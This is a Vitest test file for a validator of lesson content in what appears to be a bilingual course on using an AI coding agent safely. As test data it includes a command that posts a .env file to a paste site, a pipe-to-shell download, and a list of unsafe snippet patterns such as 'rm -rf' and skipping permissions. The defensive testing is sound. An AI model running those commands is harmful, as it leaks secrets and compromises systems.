import { describe, expect, it } from 'vitest';
import { fixtureContent, fixtureParts } from '../test/fixtures';
import { createContent } from './index';
import type { ApproveItem, ChainItem, ChoiceItem, DecodeItem, HiddenItem, Item, OrderItem, PairsItem, PredictItem, UnitBody } from './types';
import { CARD_RANGE, ITEM_RANGE, UNSAFE_SNIPPET, validateContent } from './validate';

type Parts = typeof fixtureParts;

function mutated(fn: (p: Parts) => void) {
  const p = structuredClone(fixtureParts);
  fn(p);
  return validateContent(createContent(p.units, p.types, p.bodies));
}

function item<T extends Item>(p: Parts, id: string): T {
  const found = p.bodies.demo!.items.find((i) => i.id === id);
  if (!found) throw new Error(`no item ${id}`);
  return found as T;
}

function expectOne(problems: string[], id: string) {
  expect(problems).toHaveLength(1);
  expect(problems[0]).toContain(id);
}

describe('validateContent', () => {
  it('accepts the fixture', () => {
    expect(validateContent(fixtureContent)).toEqual([]);
  });

  it('1: flags an empty ja anywhere, with its path', () => {
    const problems = mutated((p) => {
      item<ApproveItem>(p, 'demo-approve').outcomes.no.feedback.ja = '';
    });
    expect(problems).toEqual(['demo/demo-approve: ja text empty at outcomes.no.feedback']);
  });

  it('1: flags an empty ja in a card demo', () => {
    const problems = mutated((p) => {
      const demo = p.bodies.demo!.cards[0]!.demo;
      if (demo?.kind !== 'terminal') throw new Error('expected terminal demo');
      demo.commands[1]!.output[1]!.note!.ja = '  ';
    });
    expectOne(problems, 'demo-card-terminal');
  });

  it('2: flags a duplicate item id across units', () => {
    const problems = mutated((p) => {
      const meta = { ...structuredClone(p.units[0]!), key: 'demo2' };
      const body: UnitBody = structuredClone(p.bodies.demo!);
      body.items.forEach((i, n) => {
        if (n > 0) i.id = `x-${i.id}`;
      });
      p.units.push(meta);
      p.bodies.demo2 = body;
    });
    expectOne(problems, 'demo-approve');
  });

  it('3: flags predict.answer out of range', () => {
    expectOne(mutated((p) => void (item<PredictItem>(p, 'demo-predict').answer = 3)), 'demo-predict');
  });

  it('4: flags an empty approve.accept', () => {
    expectOne(mutated((p) => void (item<ApproveItem>(p, 'demo-approve').accept = [])), 'demo-approve');
  });

  it('5: flags a dangerous approve without headlines', () => {
    const problems = mutated((p) => {
      const a = item<ApproveItem>(p, 'demo-approve');
      a.accept = ['no'];
      a.outcomes.yes.headline = { en: 'BREAKING', ja: '速報' };
    });
    expectOne(problems, 'demo-approve');
  });

  it('6: flags a harmless approve with a headline', () => {
    const problems = mutated((p) => {
      item<ApproveItem>(p, 'demo-approve').outcomes.always.headline = { en: 'BREAKING', ja: '速報' };
    });
    expectOne(problems, 'demo-approve');
  });

  it('7: flags combo.accept that is not the options with removes', () => {
    expectOne(mutated((p) => void (item<ChoiceItem>(p, 'demo-combo').accept = [0])), 'demo-combo');
  });

  it('8: flags an empty hidden.answer', () => {
    expectOne(mutated((p) => void (item<HiddenItem>(p, 'demo-hidden').answer = [])), 'demo-hidden');
  });

  it('8: flags a hidden.answer out of range', () => {
    expectOne(mutated((p) => void (item<HiddenItem>(p, 'demo-hidden').answer = [2, 3])), 'demo-hidden');
  });

  it('9: flags chain.answer out of range', () => {
    expectOne(mutated((p) => void (item<ChainItem>(p, 'demo-chain').answer = -1)), 'demo-chain');
  });

  it('10: flags order.start that is not a permutation', () => {
    expectOne(mutated((p) => void (item<OrderItem>(p, 'demo-order').start = ['ask', 'ask', 'tool'])), 'demo-order');
  });

  it('10: flags order.start that is already solved', () => {
    expectOne(mutated((p) => void (item<OrderItem>(p, 'demo-order').start = ['ask', 'tool', 'result'])), 'demo-order');
  });

  it('11: flags a pairs order that is not a permutation', () => {
    expectOne(mutated((p) => void (item<PairsItem>(p, 'demo-pairs').order = ['env', 'zshrc', 'ssh', 'nope'])), 'demo-pairs');
  });

  it('11: flags pairs with other than 4 items', () => {
    const problems = mutated((p) => {
      const it = item<PairsItem>(p, 'demo-pairs');
      it.items.pop();
      it.order = it.items.map((i) => i.id);
    });
    expectOne(problems, 'demo-pairs');
  });

  it('11: flags decode with fewer than 3 parts', () => {
    const problems = mutated((p) => {
      const it = item<DecodeItem>(p, 'demo-decode');
      it.parts.pop();
      it.order = ['rf', 'rm'];
    });
    expectOne(problems, 'demo-decode');
  });

  it('11: flags a decode order that is not a permutation', () => {
    expectOne(mutated((p) => void (item<DecodeItem>(p, 'demo-decode').order = ['rm', 'rf'])), 'demo-decode');
  });

  it('12: flags a real, unlisted host in any text', () => {
    const problems = mutated((p) => {
      item<PredictItem>(p, 'demo-predict').explain.en = 'See https://evil.com/x for more.';
    });
    expectOne(problems, 'demo-predict');
  });

  it('12: flags a navigate target without a scheme', () => {
    const problems = mutated((p) => {
      item<ChainItem>(p, 'demo-chain').steps[1]!.target = 'evil.com/inbox';
    });
    expectOne(problems, 'demo-chain');
  });

  it('12: does not treat a schemeless target of a non-navigate tool as a URL', () => {
    const problems = mutated((p) => {
      item<ChainItem>(p, 'demo-chain').steps[0]!.target = 'evil.com/inbox';
    });
    expect(problems).toEqual([]);
  });

  it('12: reports a host once per item', () => {
    const problems = mutated((p) => {
      const c = item<ChainItem>(p, 'demo-chain');
      c.steps[1]!.target = 'https://evil.com/a';
      c.steps[2]!.target = 'https://evil.com/?d=1';
    });
    expectOne(problems, 'demo-chain');
  });

  it('12: flags a browser scene url', () => {
    const problems = mutated((p) => {
      const c = item<ChainItem>(p, 'demo-chain');
      if (c.scene.kind !== 'browser') throw new Error('expected browser scene');
      c.scene.url = 'shop.com/cart';
    });
    expectOne(problems, 'demo-chain');
  });

  it('12: allows reserved hosts and the real-host allowlist', () => {
    const problems = mutated((p) => {
      item<DecodeItem>(p, 'demo-decode').command =
        'curl -d @.env https://paste.rs && curl http://localhost:3000 https://a.example.org https://x.test https://y.invalid';
    });
    expect(problems).toEqual([]);
  });

  it('13: flags a secret-looking string without FAKE', () => {
    expectOne(mutated((p) => void (item<DecodeItem>(p, 'demo-decode').command = 'export KEY=sk_live_abc123')), 'demo-decode');
  });

  it('13: allows a fake secret', () => {
    expect(mutated((p) => void (item<DecodeItem>(p, 'demo-decode').command = 'export KEY=ghp_FAKE_abc123'))).toEqual([]);
  });

  it('14: flags a ready unit with too few cards', () => {
    expectOne(
      mutated((p) => void p.bodies.demo!.cards.splice(CARD_RANGE[0] - 1)),
      'demo',
    );
  });

  it('14: flags a ready unit with too many items', () => {
    const problems = mutated((p) => {
      const items = p.bodies.demo!.items;
      const extra = Array.from({ length: ITEM_RANGE[1] + 1 - items.length }, (_, n) => ({
        ...structuredClone(items[0]!),
        id: `more-${n}`,
      }));
      items.push(...extra);
    });
    expectOne(problems, 'demo');
  });

  it('15: flags a ready unit with a bad lastChecked', () => {
    expectOne(mutated((p) => void (p.units[0]!.lastChecked = '21 Oct 2026')), 'demo');
  });

  it('15: flags a ready unit with 2 or 9 docs', () => {
    const doc = { ref: { slug: 'permissions' }, note: { en: 'Read this.', ja: '読む。' } };
    for (const n of [2, 9]) {
      const problems = mutated((p) => void (p.units[0]!.docs = Array.from({ length: n }, () => structuredClone(doc))));
      expect(problems).toEqual(['demo: ready unit needs 3–8 docs, has ' + n]);
    }
  });

  it('15: flags a ready unit with a missing or malformed linksChecked', () => {
    expectOne(mutated((p) => void delete p.units[0]!.linksChecked), 'linksChecked');
    expectOne(mutated((p) => void (p.units[0]!.linksChecked = '22/10/2026')), 'linksChecked');
  });

  it('18: flags an unknown doc slug', () => {
    const problems = mutated((p) => void (p.units[0]!.docs![0]!.ref = { slug: 'x' }));
    expect(problems).toEqual(['demo: unknown doc slug "x"']);
  });

  it('18: flags a link host that is not allowed', () => {
    const problems = mutated((p) => void (p.units[0]!.docs![0]!.ref = { url: 'https://evil.example/a', lang: 'en' }));
    expect(problems).toEqual(['demo: link host "evil.example" not allowed']);
  });

  it('18: allows github.com only under /anthropics/', () => {
    expect(mutated((p) => void (p.units[0]!.docs![0]!.ref = { url: 'https://github.com/anthropics/sandbox-runtime', lang: 'en' }))).toEqual([]);
    const problems = mutated((p) => void (p.units[0]!.docs![0]!.ref = { url: 'https://github.com/other/repo', lang: 'en' }));
    expect(problems).toHaveLength(1);
    expect(problems[0]).toContain('github.com');
  });

  it('18: checks `more` on cards and items too', () => {
    expect(mutated((p) => void (p.bodies.demo!.cards[0]!.more = { slug: 'nope' }))).toEqual(['demo/demo-card-terminal: unknown doc slug "nope"']);
    expect(mutated((p) => void (item<ApproveItem>(p, 'demo-approve').more = { url: 'https://bad.example/', lang: 'en' }))).toEqual([
      'demo/demo-approve: link host "bad.example" not allowed',
    ]);
  });

  it('18: flags an empty doc note', () => {
    expectOne(mutated((p) => void (p.units[0]!.docs![0]!.note.ja = '')), 'ja text empty');
  });

  describe('try it cards', () => {
    const tryOf = (p: Parts) => p.bodies.demo!.cards[1]!.try!;
    it('flags copy on an unsafe snippet', () => {
      const problems = mutated((p) => void tryOf(p).terminal.push({ text: { en: 'Install.', ja: '導入。' }, code: 'curl -s x | sh', copy: true }));
      expect(problems).toHaveLength(1);
      expect(problems[0]).toContain('unsafe snippet has copy');
    });
    it('flags copy without code', () => {
      expect(mutated((p) => void (tryOf(p).terminal[2]!.copy = true))).toHaveLength(1);
    });
    it('flags a try with no terminal steps', () => {
      expect(mutated((p) => void (tryOf(p).terminal = []))).toHaveLength(1);
    });
    it('flags a try with neither desktop nor desktopNote', () => {
      expect(mutated((p) => void delete tryOf(p).desktopNote)).toHaveLength(1);
    });
    it('flags empty ja in try and deep', () => {
      expect(mutated((p) => void (tryOf(p).check.ja = ''))).toHaveLength(1);
      expect(mutated((p) => void (p.bodies.demo!.cards[1]!.deep!.body[0]!.ja = ''))).toHaveLength(1);
    });
    it('UNSAFE_SNIPPET catches the dangerous shapes and spares the safe ones', () => {
      for (const bad of ['rm -rf x', 'sudo ls', 'wget x', 'a | bash', 'chmod +x a', 'claude --dangerously-skip-permissions', 'echo > f', '> f'])
        expect(UNSAFE_SNIPPET.test(bad), bad).toBe(true);
      for (const ok of ['claude', 'cd ~/project', 'claude --version', '/help']) expect(UNSAFE_SNIPPET.test(ok), ok).toBe(false);
    });
  });

  it('16: flags a ready unit with no body', () => {
    expectOne(mutated((p) => void delete p.bodies.demo), 'demo');
  });

  it('16: flags a body for a soon unit', () => {
    expectOne(mutated((p) => void (p.units[0]!.status = 'soon')), 'demo');
  });

  it('17: flags a chip key that is not a practice type', () => {
    expectOne(mutated((p) => void p.units[0]!.chips.push('nope')), 'nope');
  });

  it('18: flags a wrong predict option without feedback', () => {
    expectOne(mutated((p) => void delete item<PredictItem>(p, 'demo-predict').opts[2]!.feedback), 'demo-predict');
  });
});
